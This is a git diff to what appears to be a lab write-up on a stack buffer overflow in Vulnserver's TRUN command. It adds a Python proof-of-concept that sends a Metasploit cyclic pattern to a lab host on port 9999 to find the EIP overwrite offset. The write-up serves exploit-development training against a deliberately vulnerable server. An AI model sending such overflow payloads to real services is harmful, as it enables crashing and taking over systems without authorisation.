@@ -36,3 +36,24 @@ Additional testing proves that a 2500 byte buffer will also cause the Vulnserver
 	> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
 
 Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.
+
+  Vulnserver TRUN Python Script: Pattern
+    #!/usr/bin/python
+    import socket
+    import os
+    import sys
+
+    crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>
+
+    buffer="TRUN /.:/"
+    buffer+=crash
+
+    print "Sending evil TRUN request to VulnServer, OS-42279"
+    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+    expl.connect(("192.168.83.128", 9999))
+    expl.send(buffer)
+    expl.close()
+
+Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.
+
+![trun-eip-overwrite-media-02](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02png)
